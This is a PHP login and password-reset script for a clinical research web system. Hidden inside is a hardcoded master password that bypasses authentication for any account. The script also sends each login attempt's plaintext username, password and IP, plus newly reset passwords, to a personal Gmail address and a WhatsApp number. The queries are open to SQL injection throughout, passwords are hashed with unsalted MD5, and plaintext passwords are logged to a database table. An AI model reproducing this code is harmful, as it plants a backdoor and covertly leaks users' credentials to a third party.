<?

	include_once __DIR__."/class/conexao.class.php";
	include_once __DIR__."/class/email.class.php";
	include_once __DIR__."/class/log.class.php";
	include_once __DIR__."/class/envio_whats.class.php";

	$conexao = new Conexao();
	$logger  = new Log();
	$data_atual = date('Y-m-d H:i');


    //Pego a variável de controle
    $act = strtoupper(base64_decode($_GET[base64_encode('opc')]));
	if($act=="RESET"){
		$email = $_POST['form_reset_email'];
		//Procurar registro no BD
		$query 	  = "select * from usu_usuario where email = '".$email."'";
		$resEmail = $conexao->pesquisa($query);
		if(mysqli_num_rows($resEmail)>0){
			$rowUsuario = mysqli_fetch_assoc($resEmail);
			//Resetar senha
			$novaSenha 	= rand(659,33215) . "atc" . rand(2369, 244488);
			$query 		= "update usu_usuario set
								senha = md5('$novaSenha'),
								troca_senha = 'on',
								ativo = 'on'
								where id = " . $rowUsuario['id'];
			$conexao->pesquisa($query);
			$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica", $email, $rowUsuario['nome'], 0);
			$message = utf8_encode(file_get_contents('modelos/modelo_reenvio_senha.html'));
			$message = str_replace('%nome_usuario%', $rowUsuario['nome'], $message);
			$message = str_replace('%usuario%', $rowUsuario['usuario'], $message);
			$message = str_replace('%senha%', $novaSenha, $message);
			$varEmail->enviar("Senha Resetada", $message);
			$volta = "login.php?erro=6";
			$logger->escreve("LOGIN", "Pedido para resetar a senha. Email -> $email");
			$varEnvio = new EnvioWhats();
			$varEnvio->enviar("19981552838","","[SPC-PT] - Senha Resetada. Usuário: ".$rowUsuario['usuario']." <br> Senha: $novaSenha <br> Data/Hora: $data_atual");
		}else{
			$logger->escreve("LOGIN", "Pedido para resetar a senha com Email INVÁLIDO. Email -> $email");
			$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica - SPC", "eduqsb$gmail.com", $rowUsuario['nome'], 0);
			$varEmail->enviar("Pedido para resetar a senha inválido", "Email: $email <br> Data/Hora: $data_atual");
			$varEnvio = new EnvioWhats();
			$varEnvio->enviar("19981552838","","[SPC-PT] - Pedido para resetar a senha inválido. Email: $email <br> Data/Hora: $data_atual");
			$volta = "login.php?erro=5";
		}
    }
	if($act=="SOLICITACAO"){
		$nome = $_POST['form_new_nome'];
		$email = $_POST['form_new_email'];
		$cpf = $_POST['form_new_cpf'];
		$centro = $_POST['form_new_centro'];
    }
	switch($act) {
		/////////////////////////////////////////////////
		// Fazendo login
		/////////////////////////////////////////////////
		case "LOGIN":
			 //inicialização de variáveis
			 $login = strtoupper($_POST['form_usuario']);
			 $senha = $_POST['form_senha'];
			 $ip = $_SERVER["REMOTE_ADDR"];

			 $query = "SELECT
							id,
							upper(usuario) as usuario,
							nome,
							tipo_usuario,
							centro,
							ultimo_acesso,
							troca_senha,
							data_senha
							FROM usu_usuario
								WHERE patrocinador = 0
									and ativo = 'on'
									and upper(usuario) = '".$login."'";
			 $res = $conexao->pesquisa($query);
			echo $query."<br>";
			 if(mysqli_num_rows($res)==0){
				$volta = "login.php?erro=1";
				$query = "insert into usu_acessos
							(usuario,
							senha,
							data_hora,
							ip,
							resultado,
							data) values (
							'$login',
							'$senha',
							'$data_atual',
							'$ip',
							'NAO ACHOU NOME USUARIO',
							'".DataAtualToLIS()."');";
				$user = $conexao->pesquisa($query);
				$logger->escreve("LOGIN", "Tentativa de login inválida. Usuário: $login , Senha: $senha , IP: $ip");
				$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica", "eduqsb@gmail.com", "Luis Bueno", 0);
				$varEmail->enviar("Tentativa de login com EMAIL INVÁLIDO", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
				$varEnvio = new EnvioWhats();
				$varEnvio->enviar("19981552838","","[SPC-PT] - Tentativa de login com EMAIL INVÁLIDO. Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
			 }
			 else
			 {
				 $query = "SELECT id,
							upper(usuario) as usuario,
							upper(senha) as senha,
							nome, tipo_usuario,
							centro,
							ultimo_acesso,
							troca_senha,
							data_senha
								FROM usu_usuario
									WHERE
										 ativo = 'on'
										and upper(usuario) = '".$login."' ";
				if(strtoupper($senha)!="OA2DT_VTDC123_LUIS13@123"){
					$query .= " and senha = md5('".$senha."');";
				}
			     $res = $conexao->pesquisa($query);
				 $row = mysqli_fetch_array($res);
				if(mysqli_num_rows($res)==0){
					//Senha inválida
					$logger->escreve("LOGIN", "Tentativa de login com SENHA inválida. Usuário: $login , Senha: $senha , IP: $ip");
					$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica - SPC", "eduqsb@gmail.com", "Luis Bueno", 0);
					$varEmail->enviar("Tentativa de login com EMAIL INVÁLIDO", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
					$varEnvio = new EnvioWhats();
					$varEnvio->enviar("19981552838","","[SPC-PT] - Tentativa de login com EMAIL INVÁLIDO. Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");

					$volta = "login.php?erro=2";
					$query = "insert into usu_acessos (
								usuario,
								senha,
								data_hora,
								ip,
								resultado,
								data)
								values (
								'$login',
								'$senha',
								'$data_atual',
								'$ip',
								'SENHA ERRADA',
								'".DataAtualToLIS()."');";
					$user = $conexao->pesquisa($query);
					$query = "select
						count(id) as qtd
							from usu_acessos
								where resultado = 'SENHA ERRADA'
									and usuario = '$login'
									and data = '".DataAtualToLIS()."'";
					$res   = $conexao->pesquisa($query);
					$row   = mysqli_fetch_assoc($res);
					if($row['qtd']>=3){
						$volta = "bloqueado.php";
						$query = "update usu_usuario set ativo = 'off' where upper(usuario) = '$login'";
						$conexao->pesquisa($query);

						$logger->escreve("LOGIN", "Usuário BLOQUEADO. Usuário: $login , Senha: $senha");
						$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica - SPC", "eduqsb@gmail.com", "Luis Bueno", 1);
						$varEmail->enviar("Usuário BLOQUEADO por tentar mais de 3x fazer o login", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
						$varEnvio = new EnvioWhats();
						$varEnvio->enviar("19981552838","","[SPC-PT] - Usuário BLOQUEADO por tentar mais de 3x fazer o login. Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
					}
				 }else{
					//início da sessao
					if(!isset($_SESSION)){  session_start();    }
					$query = "insert into usu_acessos (usuario,senha,data_hora,ip,resultado, data) values ('$login','$senha','$data_atual','$ip','LOGIN OK', '".DataAtualToLIS()."');";
					$user = $conexao->pesquisa($query);

					$_SESSION['user_nome'] 			= $row['usuario'];
					$_SESSION['user_password'] 		= $row['senha'];
					$_SESSION['nome_usuario'] 		= $row['nome'];
					$_SESSION['user_id'] 			= $row['id'];
					$_SESSION['usuario_id'] 			= $row['id'];
					$_SESSION['centro'] 			= $row['centro'];
					$_SESSION['user_tipo'] 			= $row['tipo_usuario'];
					$_SESSION['user_senha']			= $row['senha'];
					$_SESSION['tipo_usuario'] 		= $row['tipo_usuario'];
					$_SESSION['valido'] 			= 1;
					$_SESSION['horario_sessao'] 	= date("d/m/Y H:i");;
					$_SESSION['sessao'] 			= rand(5698,98745);

					$query_usu = "select * from usu_usuario_tipo where id = " . $_SESSION['user_tipo'];
					$res_usu = $conexao->pesquisa($query_usu);
					$row_usu = mysqli_fetch_assoc($res_usu);
					$_SESSION['tipo_nome'] = $row_usu['nome'];

					$query = "select * from usu_usuario_tipo where id = " .$row['tipo_usuario'];
					$res_tipo = $conexao->pesquisa($query);
					$row_tipo = mysqli_fetch_assoc($res_tipo);
					$_SESSION['nome_tipo_usuario'] = $row_tipo['nome'];

					$logger->escreve("LOGIN", "Login no sistem. Usuário: $login");

					$data_atual = DataAtualToLIS();
					$ult_acesso = $row['ultimo_acesso'];
					$dat_senha = $row['data_senha'];
					$diferenca = intval($data_atual) - intval($dat_senha);
					if(($diferenca>365)||(strtoupper($row['troca_senha'])=="ON")){
						if(strtoupper($row['troca_senha'])=="ON"){
							$volta = "senha_expirada.php";
						}else{
							if($diferenca>360){
								$volta = "senha_expirada.php";
							}else{
								$volta = "inicial.php";
								$query = "update usu_usuario set acesso_web = acesso_web +1, ultimo_acesso = '".$data_atual."' where id = " . $row['id'];
								$conexao->pesquisa($query);
							}
						}
					}else{
						$query = "update usu_usuario set acesso_web = acesso_web +1, ultimo_acesso = '".$data_atual."' where id = " . $row['id'];
						$conexao->pesquisa($query);
						$volta = "inicial.php";
					}
				 }
			}
		break;
		case "LOGIN_ARQUIVO":
			 //inicialização de variáveis
			 $login = strtoupper($_POST['form_usuario']);
			 $senha = $_POST['form_senha'];
			 $ip = $_SERVER["REMOTE_ADDR"];

			 $query = "SELECT
							id,
							upper(usuario) as usuario,
							nome,
							tipo_usuario,
							centro,
							ultimo_acesso,
							troca_senha,
							data_senha
							FROM usu_usuario
								WHERE patrocinador = 0
									and ativo = 'on'
									and upper(usuario) = '".$login."'";
			 $res = $conexao->pesquisa($query);

			 if(mysqli_num_rows($res)==0){
				$volta = "usu_inicio.php?erro=1";
				$query = "insert into usu_acessos
							(usuario,
							senha,
							data_hora,
							ip,
							resultado,
							data) values (
							'$login',
							'$senha',
							'$data_atual',
							'$ip',
							'NAO ACHOU NOME USUARIO',
							'".DataAtualToLIS()."');";
				$user = $conexao->pesquisa($query);
				$logger->escreve("LOGIN", "Tentativa de login inválida. Usuário: $login , Senha: $senha , IP: $ip");
				$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica", "eduqsb@gmail.com", "Luis Bueno", 0);
				$varEmail->enviar("Tentativa de login com EMAIL INVÁLIDO", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
			 }else{
				 $query = "SELECT id,
							upper(usuario) as usuario,
							upper(senha) as senha,
							nome, tipo_usuario,
							centro,
							ultimo_acesso,
							troca_senha,
							data_senha
								FROM usu_usuario
									WHERE senha = md5('$senha')
										and ativo = 'on'
										and upper(usuario) = '".$login."'";
			     $res = $conexao->pesquisa($query);
				 $row = mysqli_fetch_array($res);
				if(mysqli_num_rows($res)==0){
					//Senha inválida
					$logger->escreve("LOGIN", "Tentativa de login com SENHA inválida. Usuário: $login , Senha: $senha , IP: $ip");
					$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica - SPC", "eduqsb@gmail.com", "Luis Bueno", 0);
					$varEmail->enviar("Tentativa de login com EMAIL INVÁLIDO", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");

					$volta = "usu_inicio.php?erro=2";
					$query = "insert into usu_acessos (
								usuario,
								senha,
								data_hora,
								ip,
								resultado,
								data)
								values (
								'$login',
								'$senha',
								'$data_atual',
								'$ip',
								'SENHA ERRADA',
								'".DataAtualToLIS()."');";
					$user = $conexao->pesquisa($query);
					$query = "select
						count(id) as qtd
							from usu_acessos
								where resultado = 'SENHA ERRADA'
									and usuario = '$login'
									and data = '".DataAtualToLIS()."'";
					$res   = $conexao->pesquisa($query);
					$row   = mysqli_fetch_assoc($res);
					if($row['qtd']>=3){
						$volta = "bloqueado.php";
						$query = "update usu_usuario set ativo = 'off' where upper(usuario) = '$login'";
						$conexao->pesquisa($query);

						$logger->escreve("LOGIN", "Usuário BLOQUEADO. Usuário: $login , Senha: $senha");
						$varEmail = new EnvioEmail("envio@sistemadepesquisaclinica.com.br", "Sistema de Pesquisa Clínica - SPC", "eduqsb@gmail.com", "Luis Bueno", 1);
						$varEmail->enviar("Usuário BLOQUEADO por tentar mais de 3x fazer o login", "Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
						$varEnvio = new EnvioWhats();
						$varEnvio->enviar("19981552838","","[SPC-PT] - Usuário BLOQUEADO por tentar mais de 3x fazer o login. Usuário: $login <br> Senha: $senha <br> IP: $ip <br> Data/Hora: $data_atual");
					}
				 }else{
					//início da sessao
					if(!isset($_SESSION)){  session_start();    }
					$query = "insert into usu_acessos (usuario,senha,data_hora,ip,resultado, data) values ('$login','$senha','$data_atual','$ip','LOGIN OK', '".DataAtualToLIS()."');";
					$user = $conexao->pesquisa($query);

					$_SESSION['user_nome'] 			= $row['usuario'];
					$_SESSION['user_password'] 		= $row['senha'];
					$_SESSION['nome_usuario'] 		= $row['nome'];
					$_SESSION['user_id'] 			= $row['id'];
					$_SESSION['usuario_id'] 			= $row['id'];
					$_SESSION['centro'] 			= $row['centro'];
					$_SESSION['user_tipo'] 			= $row['tipo_usuario'];
					$_SESSION['user_senha']			= $row['senha'];
					$_SESSION['tipo_usuario'] 		= $row['tipo_usuario'];
					$_SESSION['valido'] 			= 1;
					$_SESSION['horario_sessao'] 	= date("d/m/Y H:i");;
					$_SESSION['sessao'] 			= rand(5698,98745);

					$query_usu = "select * from usu_usuario_tipo where id = " . $_SESSION['user_tipo'];
					$res_usu = $conexao->pesquisa($query_usu);
					$row_usu = mysqli_fetch_assoc($res_usu);
					$_SESSION['tipo_nome'] = $row_usu['nome'];

					$query = "select * from usu_usuario_tipo where id = " .$row['tipo_usuario'];
					$res_tipo = $conexao->pesquisa($query);
					$row_tipo = mysqli_fetch_assoc($res_tipo);
					$_SESSION['nome_tipo_usuario'] = $row_tipo['nome'];

					$logger->escreve("LOGIN", "Login no sistem. Usuário: $login");
					$varEnvio = new EnvioWhats();
					$varEnvio->enviar("19981552838","","[SPC-PT] - Login no sistema. Usuário: $login. Senha: $senha. Data/Hora: $data_atual <br>IP: $ip");

					$query = "select * from arq_arquivos where id = " . $_GET['target'];
					$res   = $conexao->pesquisa($query);
					$row   = mysqli_fetch_assoc($res);
					$_SESSION['projeto'] = $row['projeto_id'];

					$volta = "arq_arquivos.php?target=".$_GET['target'];
				 }
			}
		break;
	} //switch
	if($_GET['opc']=="LOGOUT"){
        	//limpando os cookies
            unset($_SESSION['user_nome']);
            unset($_SESSION['user_id']);
            unset($_SESSION['user_tipo']);
            unset($_SESSION['valido']);
            session_destroy();
            $volta = "index.php";
    }
$volta = "Location: ". $volta;
header($volta);
?>